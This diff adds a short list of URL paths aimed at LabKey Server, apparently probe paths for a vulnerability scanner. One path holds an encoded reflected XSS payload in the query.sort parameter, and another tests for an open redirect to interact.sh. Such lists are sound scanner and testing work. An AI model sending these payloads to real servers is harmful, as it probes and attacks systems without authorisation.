@@ -1,0 +1,4 @@
+/labkey/home/login-login.view
+/login/home/login.view
+/__r2/query-printRows.view?schemaName=ListManager&query.queryName=ListManager&query.sort=Nameelk5q%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ezp59r&query.containerFilterName=CurrentAndSubfolders&query.selectionKey=%24ListManager%24ListManager%24%24query&query.showRows=ALL
+/labkey/__r1/login-login.view?returnUrl=http://interact.sh
